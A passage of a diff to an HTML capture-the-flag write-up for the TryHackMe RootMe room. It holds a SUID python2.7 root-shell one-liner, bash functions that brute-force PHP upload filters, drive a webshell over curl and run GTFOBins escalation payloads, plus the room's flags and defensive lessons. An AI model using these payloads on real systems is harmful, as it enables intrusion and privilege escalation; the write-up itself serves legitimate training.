-                <strong>Answer:</strong> The weird SUID file is <strong>/usr/bin/python2.7</strong>
-            </blockquote>
+            <blockquote><strong>Answer:</strong> The weird SUID file is <strong>/usr/bin/python2.7</strong></blockquote>
 
             <div class="highlight-box">
                 <h4>Why is python2.7 SUID Dangerous?</h4>
                 <p>Python with the SUID bit set allows any user to execute Python code with root privileges. This is a critical misconfiguration because Python can directly manipulate process UIDs via the <code>os</code> module.</p>
-                <p><strong>Reference:</strong> <a href="https://gtfobins.github.io/gtfobins/python/#suid" target="_blank" style="color: var(--aqua);">GTFOBins - Python SUID</a></p>
+                <p><strong>Reference:</strong> <a href="https://gtfobins.github.io/gtfobins/python/#suid" target="_blank">GTFOBins — Python SUID</a></p>
             </div>
 
             <h3>Exploitation</h3>
             <pre><code>python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></pre>
-
             <p>This:</p>
             <ol>
-                <li><code>os.setuid(0)</code> - Sets the effective user ID to root (UID 0), which works because the SUID bit makes the process run with the file owner's (root's) privileges</li>
-                <li><code>os.system("/bin/bash")</code> - Spawns a root shell</li>
+                <li><code>os.setuid(0)</code> — Sets effective UID to root, works because SUID makes the process run as file owner (root)</li>
+                <li><code>os.system("/bin/bash")</code> — Spawns a root shell</li>
             </ol>
 
             <h3>Verification</h3>
@@ -522,37 +587,18 @@ curl http://10.49.170.219/uploads/shell.php5</code></pre>
 
             <h3>Root Flag</h3>
             <pre><code>cat /root/root.txt</code></pre>
+            <div class="flag">&#x1f6a9; ROOT FLAG: THM{pr1v1l3g3_3sc4l4t10n}</div>
 
-            <div class="flag">
-                🚩 ROOT FLAG: THM{pr1v1l3g3_3sc4l4t10n}
-            </div>
-
+            <!-- ════ ATTACK SUMMARY ════ -->
             <h2>Attack Chain Summary</h2>
 
-            <div class="highlight-box" style="border-color: var(--orange);">
-                <h4 style="color: var(--orange);">⏱️ Manual vs Automated</h4>
-                <table style="margin-top: 10px;">
-                    <thead>
-                        <tr>
-                            <th>Method</th>
-                            <th>Time</th>
-                            <th>Commands</th>
-                            <th>Best For</th>
-                        </tr>
-                    </thead>
+            <div class="highlight-box" style="border-color:rgba(254,128,25,.22);">
+                <h4><i class="fas fa-clock"></i> Manual vs Automated</h4>
+                <table style="margin-top:.5rem;">
+                    <thead><tr><th>Method</th><th>Time</th><th>Commands</th><th>Best For</th></tr></thead>
                     <tbody>
-                        <tr>
-                            <td><strong>Manual</strong></td>
-                            <td>~15-30 min</td>
-                            <td>20+ commands</td>
-                            <td>Learning, understanding the attack flow</td>
-                        </tr>
-                        <tr style="background: rgba(184, 187, 38, 0.1);">
-                            <td><strong>Automated</strong></td>
-                            <td>~2-5 min</td>
-                            <td>1 command</td>
-                            <td>Speed, repeatability, portfolio demonstration</td>
-                        </tr>
+                        <tr><td><strong>Manual</strong></td><td>~15-30 min</td><td>20+</td><td>Learning, understanding the attack flow</td></tr>
+                        <tr style="background:rgba(184,187,38,.04);"><td><strong>Automated</strong></td><td>~2-5 min</td><td>1</td><td>Speed, repeatability, portfolio demonstration</td></tr>
                     </tbody>
                 </table>
             </div>
@@ -574,28 +620,15 @@ curl http://10.49.170.219/uploads/shell.php5</code></pre>
 
             <h2>Flags Captured</h2>
             <table>
-                <thead>
-                    <tr>
-                        <th>Flag</th>
-                        <th>Location</th>
-                        <th>Value</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>Flag</th><th>Location</th><th>Value</th></tr></thead>
                 <tbody>
-                    <tr>
-                        <td>user.txt</td>
-                        <td>/var/www/user.txt</td>
-                        <td>THM{y0u_g0t_a_sh3ll}</td>
-                    </tr>
-                    <tr>
-                        <td>root.txt</td>
-                        <td>/root/root.txt</td>
-                        <td>THM{pr1v1l3g3_3sc4l4t10n}</td>
-                    </tr>
+                    <tr><td>user.txt</td><td>/var/www/user.txt</td><td>THM{y0u_g0t_a_sh3ll}</td></tr>
+                    <tr><td>root.txt</td><td>/root/root.txt</td><td>THM{pr1v1l3g3_3sc4l4t10n}</td></tr>
                 </tbody>
             </table>
 
-            <h2 id="automation-script">🤖 Automation Script Breakdown</h2>
+            <!-- ════ AUTOMATION ════ -->
+            <h2 id="automation-script"><i class="fas fa-robot"></i> Automation Script Breakdown</h2>
 
             <p>For efficiency and repeatability, I automated the entire RootMe exploitation chain into a single bash script. This section breaks down how the automation works — perfect for beginners who want to understand the connection between manual exploitation steps and scripting.</p>
 
@@ -610,8 +643,7 @@ curl http://10.49.170.219/uploads/shell.php5</code></pre>
             </div>
 
             <h3>How the Script Works</h3>
-
-            <p>The <code>rootmeautopwn</code> script mirrors the manual exploitation process but runs end-to-end without human intervention. Here's the flow:</p>
+            <p>The <code>rootmeautopwn</code> script mirrors the manual exploitation process but runs end-to-end without human intervention:</p>
 
             <div class="attack-chain">Phase 1: Dependencies Check
     ↓
@@ -634,18 +666,14 @@ Phase 9: Root Flag (cat /root/root.txt)
 Mission Report Generated</div>
 
             <h3>Script Architecture</h3>
-
-            <p><strong>Download:</strong> <a href="https://github.com/0xb0rn3/CTFS/blob/main/THM/rootmeCTF/rootmeautopwn" target="_blank" style="color: var(--aqua);">rootmeautopwn on GitHub</a></p>
-
+            <p><strong>Download:</strong> <a href="https://github.com/0xb0rn3/CTFS/blob/main/THM/rootmeCTF/rootmeautopwn" target="_blank">rootmeautopwn on GitHub</a></p>
             <p>The script is organized into discrete phases that can fail gracefully. If directory enumeration doesn't find <code>/panel/</code>, the script tries a manual <code>curl</code> check before giving up. If all upload extensions fail, it reports the failure and stops.</p>
-
-            <h3>Key Functions Explained</h3>
 
             <h4>1. Dependency Auto-Installation</h4>
             <pre><code>check_deps() {
     local missing=()
     for tool in nmap gobuster curl nc; do
-        if ! command -v "$tool" &>/dev/null; then
+        if ! command -v "$tool" &amp;&gt;/dev/null; then
             missing+=("$tool")
         fi
     done
@@ -658,27 +686,20 @@ Mission Report Generated</div>
         fi
     fi
 }</code></pre>
-
-            <p><strong>What it does:</strong> Checks if nmap, gobuster, curl, and nc are installed. If any are missing, automatically installs them using the system's package manager (pacman for Arch, apt for Debian/Ubuntu).</p>
-
-            <p><strong>Why it matters:</strong> Eliminates the "command not found" errors. The script becomes portable — run it on any Arch or Debian system and it self-configures.</p>
+            <p>Checks if nmap, gobuster, curl, and nc are installed. Auto-installs via pacman (Arch) or apt (Debian/Ubuntu). Eliminates "command not found" errors — portable across distros.</p>
 
             <h4>2. Network Interface Auto-Detection</h4>
             <pre><code>get_config() {
-    # Auto-detect LHOST from tun0 (VPN), fallback to default route
-    LHOST=$(ip addr show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+    LHOST=$(ip addr show tun0 2>/dev/null | \
+            grep "inet " | awk '{print $2}' | cut -d/ -f1)
     if [ -z "$LHOST" ]; then
-        LHOST=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
+        LHOST=$(ip route get 1.1.1.1 2>/dev/null | \
+                awk '{print $7; exit}')
     fi
-    
-    echo -e "${CYN}[*] Detected LHOST: $LHOST${NC}"
-    echo -e "${YEL}[?] Use this IP for reverse shell? (y/n):${NC}"
-    read -rp ">> " confirm
+    echo -e "[*] Detected LHOST: $LHOST"
+    read -rp "[?] Use this IP? (y/n): " confirm
 }</code></pre>
-
-            <p><strong>What it does:</strong> Automatically detects your VPN IP from the <code>tun0</code> interface (TryHackMe OpenVPN creates this). If no VPN is connected, falls back to your default route IP.</p>
-
-            <p><strong>Why it matters:</strong> You don't need to manually look up your IP with <code>ifconfig</code> or <code>ip a</code>. The script figures it out, then asks for confirmation — so you can override if needed.</p>
+            <p>Auto-detects your VPN IP from <code>tun0</code> (TryHackMe OpenVPN), falls back to default route. No more manual <code>ifconfig</code> lookups.</p>
 
             <h4>3. Upload Filter Bypass Loop</h4>
             <pre><code>phase_exploit() {
@@ -692,177 +713,111 @@ Mission Report Generated</div>
             "http://$TARGET/panel/")
         
         if echo "$response" | grep -qi "sucesso\|success"; then
-            # Verify code execution
-            local exec_test=$(curl -s "http://$TARGET/uploads/$test_name?cmd=echo+EXEC_OK")
+            local exec_test=$(curl -s \
+                "http://$TARGET/uploads/$test_name?cmd=echo+EXEC_OK")
             if echo "$exec_test" | grep -q "EXEC_OK"; then
-                echo "[+] Code execution confirmed!"
+                echo "[+] Code execution confirmed with .$ext"
                 break
             fi
         fi
     done
 }</code></pre>
-
-            <p><strong>What it does:</strong> Iterates through 5 different PHP extensions (<code>.php5</code>, <code>.phtml</code>, etc.) until one bypasses the upload filter. After each successful upload, it immediately tests code execution with <code>?cmd=echo+EXEC_OK</code>.</p>
-
-            <p><strong>Why it matters:</strong> No manual trial-and-error. The script tests all known bypass techniques and stops at the first working one. If <code>.php5</code> works, it never tries <code>.phtml</code>.</p>
-
-            <p><strong>Randomization:</strong> Notice <code>test_$(head -c 4 /dev/urandom | xxd -p).$ext</code> — this generates a random filename like <code>test_a3f8b2c1.php5</code> to avoid collisions if you run the script multiple times.</p>
+            <p>Iterates through 5 PHP extensions until one bypasses the filter. Tests code execution immediately after each upload. Random filenames (<code>test_a3f8b2c1.php5</code>) prevent collisions on re-runs.</p>
 
             <h4>4. SUID Auto-Exploitation</h4>
             <pre><code>phase_flags() {
-    local suid_list=$(exec_cmd "find /usr/bin -perm -4000 -type f 2>/dev/null")
-    local weird_suid=$(echo "$suid_list" | grep -E "python|perl|ruby" | head -1)
+    local suid_list=$(exec_cmd \
+        "find /usr/bin -perm -4000 -type f 2>/dev/null")
+    local weird=$(echo "$suid_list" | \
+        grep -E "python|perl|ruby" | head -1)
     
-    if echo "$weird_suid" | grep -q "python"; then
-        root_flag=$(exec_cmd "$weird_suid -c 'import os;os.setuid(0);os.system(\"cat /root/root.txt\")'")
-    elif echo "$weird_suid" | grep -q "perl"; then
-        root_flag=$(exec_cmd "$weird_suid -e 'use POSIX;setuid(0);exec(\"cat /root/root.txt\")'")
-    elif echo "$weird_suid" | grep -q "find"; then
-        root_flag=$(exec_cmd "$weird_suid /root/root.txt -exec cat {} \\;")
+    if echo "$weird" | grep -q "python"; then
+        root_flag=$(exec_cmd \
+            "$weird -c 'import os;os.setuid(0);os.system(\"cat /root/root.txt\")'")
+    elif echo "$weird" | grep -q "perl"; then
+        root_flag=$(exec_cmd \
+            "$weird -e 'use POSIX;setuid(0);exec(\"cat /root/root.txt\")'")
     fi
 }</code></pre>
-
-            <p><strong>What it does:</strong> Finds SUID binaries with <code>find / -perm -4000</code>, filters for exploitable ones (python, perl, find, vim, env), then automatically runs the appropriate GTFOBins payload to read <code>/root/root.txt</code>.</p>
-
-            <p><strong>Why it matters:</strong> Once you have a webshell, the script handles the privilege escalation path automatically. It doesn't just find python SUID — it immediately exploits it using the correct syntax.</p>
+            <p>Finds SUID binaries, filters for exploitable interpreters, and runs the correct GTFOBins payload automatically.</p>
 
             <h4>5. Webshell Command Executor</h4>
             <pre><code>exec_cmd() {
     local cmd="$1"
-    local encoded_cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$cmd'))")
-    curl -s "$SHELL_URL?cmd=$encoded_cmd"
+    local encoded=$(python3 -c \
+        "import urllib.parse; print(urllib.parse.quote('$cmd'))")
+    curl -s "$SHELL_URL?cmd=$encoded"
 }</code></pre>
-
-            <p><strong>What it does:</strong> Wraps every shell command in proper URL encoding and sends it to the webshell. For example, <code>exec_cmd "cat /etc/passwd"</code> becomes <code>GET /uploads/shell.php5?cmd=cat%20%2Fetc%2Fpasswd</code>.</p>
-
-            <p><strong>Why it matters:</strong> Commands with spaces, special characters, or quotes need URL encoding to work in GET parameters. This function abstracts that complexity so the rest of the script can call commands naturally.</p>
+            <p>URL-encodes every command and sends it to the webshell. Handles spaces, special characters, and quotes transparently.</p>
 
             <h3>Running the Script</h3>
-
             <pre><code># Clone the repo
 git clone https://github.com/0xb0rn3/CTFS.git
 cd CTFS/THM/rootmeCTF
 
-# Make executable
+# Make executable &amp; run
 chmod +x rootmeautopwn
-
-# Run
 ./rootmeautopwn</code></pre>
 
-            <p><strong>Interactive prompts:</strong></p>
             <pre><code>[?] Enter target IP:
->> 10.10.x.x
+&gt;&gt; 10.10.x.x
 
 [*] Detected LHOST: 10.8.x.x
 [?] Use this IP for reverse shell? (y/n):
->> y
+&gt;&gt; y
 
 [?] Listener port (default 4444):
->> 
+&gt;&gt; 
 
 [!] Ready to pwn 10.10.x.x. Proceed? (y/n):
->> y</code></pre>
+&gt;&gt; y</code></pre>
 
             <h3>Output Artifacts</h3>
-
             <p>Everything is saved to a timestamped directory <code>rootme_pwn_YYYYMMDD_HHMMSS/</code>:</p>
-
             <table>
-                <thead>
-                    <tr>
-                        <th>File</th>
-                        <th>Contents</th>
-                        <th>Use Case</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>File</th><th>Contents</th><th>Use Case</th></tr></thead>
                 <tbody>
-                    <tr>
-                        <td>nmap_scan.txt</td>
-                        <td>nmap greppable output</td>
-                        <td>Reference scan results later</td>
-                    </tr>
-                    <tr>
-                        <td>gobuster_results.txt</td>
-                        <td>Directory enumeration</td>
-                        <td>Verify all discovered paths</td>
-                    </tr>
-                    <tr>
-                        <td>suid_binaries.txt</td>
-                        <td>Full SUID binary list</td>
-                        <td>Audit for other privesc paths</td>
-                    </tr>
-                    <tr>
-                        <td>webshell_url.txt</td>
-                        <td>Active webshell URL</td>
-                        <td>Manual interaction if needed</td>
-                    </tr>
-                    <tr>
-                        <td>flags.txt</td>
-                        <td>Both user.txt and root.txt</td>
-                        <td>Submit to TryHackMe</td>
-                    </tr>
+                    <tr><td>nmap_scan.txt</td><td>nmap greppable output</td><td>Reference scan results later</td></tr>
+                    <tr><td>gobuster_results.txt</td><td>Directory enumeration</td><td>Verify all discovered paths</td></tr>
+                    <tr><td>suid_binaries.txt</td><td>Full SUID binary list</td><td>Audit for other privesc paths</td></tr>
+                    <tr><td>webshell_url.txt</td><td>Active webshell URL</td><td>Manual interaction if needed</td></tr>
+                    <tr><td>flags.txt</td><td>Both user.txt and root.txt</td><td>Submit to TryHackMe</td></tr>
                 </tbody>
             </table>
 
             <h3>Learning from the Automation</h3>
-
-            <div class="highlight-box" style="border-color: var(--blue);">
-                <h4 style="color: var(--blue);">Beginner Tips</h4>
+            <div class="highlight-box blue">
+                <h4>Beginner Tips</h4>
                 <ul>
                     <li><strong>Don't just run it blind:</strong> Read through the script first, understand what each phase does</li>
-                    <li><strong>Compare to manual steps:</strong> Notice how <code>phase_exploit()</code> mirrors the manual upload bypass process</li>
-                    <li><strong>Experiment:</strong> Modify the script to add more upload extensions, try different SUID payloads</li>
-                    <li><strong>Debug mode:</strong> Add <code>set -x</code> at the top to see every command executed</li>
-                    <li><strong>Adapt it:</strong> Use this as a template for other TryHackMe rooms with similar attack chains</li>
+                    <li><strong>Compare to manual steps:</strong> Notice how <code>phase_exploit()</code> mirrors the manual upload bypass</li>
+                    <li><strong>Experiment:</strong> Add more upload extensions, try different SUID payloads</li>
+                    <li><strong>Debug mode:</strong> Add <code>set -x</code> at the top to see every command</li>
+                    <li><strong>Adapt it:</strong> Use as a template for other rooms with similar attack chains</li>
                 </ul>
             </div>
 
-            <h3>Common Issues & Fixes</h3>
-
+            <h3>Common Issues &amp; Fixes</h3>
             <table>
-                <thead>
-                    <tr>
-                        <th>Error</th>
-                        <th>Cause</th>
-                        <th>Fix</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>Error</th><th>Cause</th><th>Fix</th></tr></thead>
                 <tbody>
-                    <tr>
-                        <td>"No wordlist found"</td>
-                        <td>SecLists not installed</td>
-                        <td>Script auto-generates minimal wordlist</td>
-                    </tr>
-                    <tr>
-                        <td>"LHOST detection failed"</td>
-                        <td>VPN not connected</td>
-                        <td>Connect to TryHackMe VPN first</td>
-                    </tr>
-                    <tr>
-                        <td>"All upload bypass failed"</td>
-                        <td>Room config changed or wrong target</td>
-                        <td>Verify target IP, check /panel/ manually</td>
-                    </tr>
-                    <tr>
-                        <td>"SUID not found"</td>
-                        <td>Script only checks /usr/bin</td>
-                        <td>Expand search to /bin /usr/local/bin</td>
-                    </tr>
+                    <tr><td>"No wordlist found"</td><td>SecLists not installed</td><td>Script auto-generates minimal wordlist</td></tr>
+                    <tr><td>"LHOST detection failed"</td><td>VPN not connected</td><td>Connect to TryHackMe VPN first</td></tr>
+                    <tr><td>"All upload bypass failed"</td><td>Room config changed or wrong target</td><td>Verify target IP, check /panel/ manually</td></tr>
+                    <tr><td>"SUID not found"</td><td>Script only checks /usr/bin</td><td>Expand search to /bin /usr/local/bin</td></tr>
                 </tbody>
             </table>
 
+            <!-- ════ LESSONS ════ -->
             <h2 id="lessons">Lessons Learned</h2>
 
             <ol>
-                <li><strong>Never rely on extension-based file upload filtering alone.</strong> Blacklisting <code>.php</code> is easily bypassed with alternative extensions (<code>.php5</code>, <code>.phtml</code>). Use allowlisting and validate file content/MIME types instead.</li>
-
-                <li><strong>SUID binaries should be audited regularly.</strong> Tools like <code>find / -perm -4000</code> reveal dangerous misconfigurations. Python, perl, and other interpreters should never have SUID set.</li>
-
-                <li><strong>Principle of least privilege matters.</strong> The web server running as <code>www-data</code> with access to upload directories combined with SUID python created a direct path from anonymous web access to root.</li>
-
+                <li><strong>Never rely on extension-based file upload filtering alone.</strong> Blacklisting <code>.php</code> is easily bypassed with alternative extensions. Use allowlisting and validate file content/MIME types instead.</li>
+                <li><strong>SUID binaries should be audited regularly.</strong> Tools like <code>find / -perm -4000</code> reveal dangerous misconfigurations. Interpreters should never have SUID set.</li>
+                <li><strong>Principle of least privilege matters.</strong> The web server running as <code>www-data</code> with upload access combined with SUID python created a direct path from anonymous web access to root.</li>
                 <li><strong>Defense recommendations:</strong>
                     <ul>
-                        <li>Implement allowlist-based upload filtering (only allow specific safe extensions like <code>.jpg</code>, <code>.png</code>)</li>
+                        <li>Implement allowlist-based upload filtering (only <code>.jpg</code>, <code>.png</code>, etc.)</li>
                         <li>Validate file content with magic bytes, not just extensions</li>
                         <li>Remove SUID bit from interpreters: <code>chmod u-s /usr/bin/python2.7</code></li>
                         <li>Use AppArmor/SELinux to restrict web server capabilities</li>
@@ -873,47 +828,88 @@ chmod +x rootmeautopwn
 
             <h2>Tools Used</h2>
             <table>
-                <thead>
-                    <tr>
-                        <th>Tool</th>
-                        <th>Purpose</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
                 <tbody>
-                    <tr>
-                        <td>nmap</td>
-                        <td>Port scanning & service detection</td>
-                    </tr>
-                    <tr>
-                        <td>gobuster</td>
-                        <td>Directory brute-forcing</td>
-                    </tr>
-                    <tr>
-                        <td>curl</td>
-                        <td>HTTP requests & file upload</td>
-                    </tr>
-                    <tr>
-                        <td>nc</td>
-                        <td>Reverse shell listener</td>
-                    </tr>
-                    <tr>
-                        <td>python2.7</td>
-                        <td>SUID privilege escalation</td>
-                    </tr>
-                    <tr style="background: rgba(184, 187, 38, 0.1);">
-                        <td><strong>rootmeautopwn</strong></td>
-                        <td><strong>Full automation script (all phases)</strong></td>
-                    </tr>
+                    <tr><td>nmap</td><td>Port scanning &amp; service detection</td></tr>
+                    <tr><td>gobuster</td><td>Directory brute-forcing</td></tr>
+                    <tr><td>curl</td><td>HTTP requests &amp; file upload</td></tr>
+                    <tr><td>nc</td><td>Reverse shell listener</td></tr>
+                    <tr><td>python2.7</td><td>SUID privilege escalation</td></tr>
+                    <tr style="background:rgba(184,187,38,.04);"><td><strong>rootmeautopwn</strong></td><td><strong>Full automation script (all phases)</strong></td></tr>
                 </tbody>
             </table>
 
-            <div class="highlight-box" style="border-color: var(--green); margin-top: 30px;">
-                <h4 style="color: var(--green);">📦 Script Repository</h4>
-                <p>The automation script and other CTF tools are available in my <a href="https://github.com/0xb0rn3/CTFS" target="_blank" style="color: var(--aqua); font-weight: bold;">CTFS GitHub repository</a>.</p>
-                <p style="margin-top: 10px;">Contributions and improvements welcome!</p>
+            <div class="highlight-box green" style="margin-top:1.5rem;">
+                <h4><i class="fas fa-box-open"></i> Script Repository</h4>
+                <p>The automation script and other CTF tools are available in my <a href="https://github.com/0xb0rn3/CTFS" target="_blank" style="font-weight:700;">CTFS GitHub repository</a>. Contributions and improvements welcome!</p>
             </div>
         </article>
 
-        <footer>
-            <p>© 2026 <a href="main.html">0xb0rn3</a> | CTF Writeups & Security Research</p>
-            <p style="margin-top: 10px;">
+        <footer class="writeup-footer">
+            <p>&copy; 2026 <a href="../main.html">[0xb0rn3]</a> &middot; CTF Writeups &amp; Security Research</p>
+            <p style="margin-top:.4rem;"><a href="https://github.com/0xb0rn3" target="_blank"><i class="fab fa-github"></i></a> &nbsp; <a href="https://x.com/oxbv1" target="_blank"><i class="fab fa-twitter"></i></a></p>
+        </footer>
+    </div>
+
+    <button class="scroll-top" id="scrollTopBtn" aria-label="Scroll to top"><i class="fas fa-chevron-up"></i></button>
+
+    <script>
+    'use strict';
+
+    /* Matrix Rain */
+    (() => {
+        const c = document.getElementById('matrixCanvas');
+        const ctx = c.getContext('2d');
+        let cols, drops;
+        const chars = '0123456789ABCDEFabcdef{}[]<>/\\|=+-_@#$%^&*~';
+        const fs = 13;
+        function resize() { c.width = innerWidth; c.height = innerHeight; cols = Math.floor(c.width/fs); drops = Array(cols).fill(1); }
+        resize(); addEventListener('resize', resize);
+        function draw() {
+            ctx.fillStyle = 'rgba(0,0,0,.06)'; ctx.fillRect(0,0,c.width,c.height);
+            ctx.fillStyle = '#fabd2f'; ctx.font = fs+'px JetBrains Mono,monospace';
+            for (let i=0;i<cols;i++) {
+                ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fs, drops[i]*fs);
+                if (drops[i]*fs > c.height && Math.random()>.975) drops[i]=0;
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 50);
+    })();
+
+    /* Mobile Nav */
+    const menuToggle = document.getElementById('menuToggle');
+    const mobileNav = document.getElementById('mobileNav');
+    const mobileOverlay = document.getElementById('mobileOverlay');
+    const toggleMenu = () => {
+        const open = mobileNav.classList.toggle('active');
+        menuToggle.classList.toggle('active');
+        mobileOverlay.classList.toggle('active');
+        document.body.style.overflow = open ? 'hidden' : '';
+    };
+    menuToggle.addEventListener('click', toggleMenu);
+    mobileOverlay.addEventListener('click', toggleMenu);
+    document.querySelectorAll('.mobile-nav-link').forEach(l => l.addEventListener('click', () => { if(!l.href.includes('http')) toggleMenu(); }));
+
+    /* Scroll */
+    const navbar = document.getElementById('navbar');
+    const scrollProg = document.getElementById('scrollProgress');
+    const scrollTopBtn = document.getElementById('scrollTopBtn');
+    addEventListener('scroll', () => {
+        const h = document.documentElement.scrollHeight - innerHeight;
+        scrollProg.style.width = ((scrollY/h)*100)+'%';
+        navbar.classList.toggle('scrolled', scrollY>60);
+        scrollTopBtn.classList.toggle('visible', scrollY>400);
+    }, {passive:true});
+    scrollTopBtn.addEventListener('click', () => scrollTo({top:0, behavior:'smooth'}));
+
+    /* Smooth anchors */
+    document.querySelectorAll('a[href^="#"]').forEach(a => {
+        a.addEventListener('click', e => {
+            const h = a.getAttribute('href');
+            if(h!=='#'){e.preventDefault();document.querySelector(h)?.scrollIntoView({behavior:'smooth'});}
+        });
+    });
+    </script>
+</body>
+</html>
